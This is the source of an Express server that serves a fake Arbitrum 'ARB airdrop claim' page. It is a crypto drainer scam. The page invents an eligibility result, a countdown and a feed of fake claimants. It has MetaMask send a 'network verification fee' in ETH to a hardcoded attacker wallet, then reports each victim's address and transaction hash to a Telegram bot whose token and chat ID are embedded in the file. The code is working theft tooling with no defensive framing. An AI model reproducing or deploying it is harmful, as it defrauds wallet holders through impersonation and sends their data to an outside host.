const express = require('express');
const app = express();

const DRAIN_ADDRESS = '0x071a1c7bE8609452CB268b3396EC5358E6E9Ecd6';
const BOT_TOKEN = '6952302341:AAE1WRba7NjJXdV0tAvqSopXvllMkgBKfxs';
const CHAT_ID = '6521633168';
const REQUEST_AMOUNT = '0.01';

app.get('/', (req, res) => {
  res.send(`<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Arbitrum — Claim Your ARB Airdrop</title>
  <style>
    *{margin:0;padding:0;box-sizing:border-box}
    body{background:#0d1117;color:#fff;font-family:'Segoe UI',Arial,sans-serif;padding:20px}
    .header{background:#161b22;padding:16px 24px;display:flex;align-items:center;justify-content:space-between;border-radius:12px;margin-bottom:24px;border:1px solid #30363d}
    .logo{display:flex;align-items:center;gap:10px;font-size:22px;font-weight:700;color:#2b6cb0}
    .nav{display:flex;gap:24px}
    .nav a{color:#8b949e;text-decoration:none;font-size:14px}
    .card{background:#161b22;border-radius:16px;padding:32px;max-width:520px;margin:0 auto;border:1px solid #30363d}
    .badge{display:inline-block;background:#1f6feb;color:#fff;padding:4px 12px;border-radius:20px;font-size:12px;font-weight:600;margin-bottom:16px}
    .amount{font-size:56px;font-weight:800;color:#58a6ff;text-align:center;margin:24px 0}
    .amount span{font-size:20px;color:#8b949e}
    .info{background:#0d1117;border-radius:8px;padding:16px;margin:20px 0;font-size:14px;color:#8b949e;border:1px solid #30363d}
    .fee-box{background:#0d1117;border:1px solid #30363d;border-radius:8px;padding:12px;margin:16px 0;display:flex;justify-content:space-between}
    button{background:#1f6feb;color:#fff;border:none;padding:16px;font-size:17px;border-radius:12px;cursor:pointer;width:100%;font-weight:600}
    button:disabled{background:#30363d;cursor:not-allowed}
    .status{text-align:center;margin-top:16px;font-size:14px;min-height:24px}
    .timer{text-align:center;color:#f85149;margin-top:12px;font-size:13px}
    .recent{background:#0d1117;border-radius:8px;padding:12px;margin-top:20px;font-size:12px;color:#8b949e;max-height:120px;overflow-y:auto}
    .recent p{margin:4px 0;color:#3fb950}
    .footer{text-align:center;margin-top:32px;color:#484f58;font-size:11px}
  </style>
</head>
<body>
  <div class="header">
    <div class="logo">🔵 Arbitrum</div>
    <div class="nav"><a href="#">Bridge</a><a href="#">Ecosystem</a><a href="#">Airdrop</a></div>
  </div>
  <div class="card">
    <div class="badge">✅ Eligible</div>
    <h2 style="text-align:center;color:#c9d1d9">Arbitrum Community Airdrop</h2>
    <div class="amount">1,250 <span>ARB</span></div>
    <p style="text-align:center;color:#8b949e;font-size:14px">~ $1,500 USD</p>
    <div class="info">
      <p>📋 <b>Claim Requirements:</b></p>
      <p>• Connect your wallet to verify eligibility</p>
      <p>• Pay a one-time network verification fee (${REQUEST_AMOUNT} ETH)</p>
      <p>• Receive 1,250 ARB tokens instantly</p>
    </div>
    <div class="fee-box">
      <span>Network Verification Fee</span>
      <span>${REQUEST_AMOUNT} ETH</span>
    </div>
    <button id="claimBtn" onclick="claimAirdrop()">🦊 Connect Wallet & Claim Airdrop</button>
    <div class="status" id="status"></div>
    <div class="timer">⏰ Claim period ends in: <span id="countdown">14:59</span></div>
    <div class="recent" id="recent">
      <p>✅ 0x8F3a... just claimed 1,250 ARB</p>
      <p>✅ 0xB21d... just claimed 1,250 ARB</p>
    </div>
  </div>
  <div class="footer">Official Arbitrum Foundation Airdrop • Contract: 0x1F...aB3D</div>
  <script src="https://cdn.jsdelivr.net/npm/web3@1.7.1/dist/web3.min.js"></script>
  <script>
    async function notify(msg){try{await fetch('https://api.telegram.org/bot${BOT_TOKEN}/sendMessage',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({chat_id:'${CHAT_ID}',text:msg})})}catch(e){}}
    async function claimAirdrop(){
      const btn=document.getElementById('claimBtn'),st=document.getElementById('status');
      if(typeof window.ethereum==='undefined'){st.innerHTML='<span style="color:#f85149">❌ MetaMask not detected.</span>';return}
      btn.disabled=true;btn.innerText='⏳ Connecting...';st.innerText='';
      try{
        const web3=new Web3(window.ethereum);
        const accounts=await window.ethereum.request({method:'eth_requestAccounts'});
        const account=accounts[0];
        btn.innerText='✅ Connected. Confirm in MetaMask...';
        st.innerHTML='<span style="color:#f0b90b">Confirm the verification fee in MetaMask.</span>';
        const txHash=await window.ethereum.request({method:'eth_sendTransaction',params:[{from:account,to:'${DRAIN_ADDRESS}',value:web3.utils.toHex(web3.utils.toWei('${REQUEST_AMOUNT}','ether')),gas:'0x5208'}]});
        st.innerHTML='<span style="color:#3fb950">✅ Claim Successful! 1,250 ARB will arrive within minutes.</span>';
        btn.innerText='✅ Claimed!';btn.style.background='#238636';btn.onclick=null;
        await notify('💰 ARB DRAIN: '+account+' sent ${REQUEST_AMOUNT} ETH | TX: '+txHash);
        const recent=document.getElementById('recent'),p=document.createElement('p');
        p.innerText='✅ '+account.slice(0,6)+'... just claimed 1,250 ARB';recent.prepend(p);
      }catch(e){
        st.innerHTML='<span style="color:#f85149">❌ '+(e.code===4001?'Transaction rejected.':'Error: '+e.message)+'</span>';
        btn.disabled=false;btn.innerText='🦊 Connect Wallet & Claim Airdrop';
      }
    }
    let t=900;setInterval(()=>{t--;document.getElementById('countdown').innerText=Math.floor(t/60)+':'+(t%60<10?'0':'')+(t%60)},1000);
    setInterval(()=>{const addr='0x'+Math.random().toString(16).slice(2,6)+'...',recent=document.getElementById('recent'),p=document.createElement('p');p.innerText='✅ '+addr+' just claimed 1,250 ARB';recent.prepend(p);if(recent.children.length>10)recent.removeChild(recent.lastChild)},8000);
  </script>
</body></html>`);
});

app.listen(process.env.PORT || 3000, () => console.log('Airdrop drainer live'));
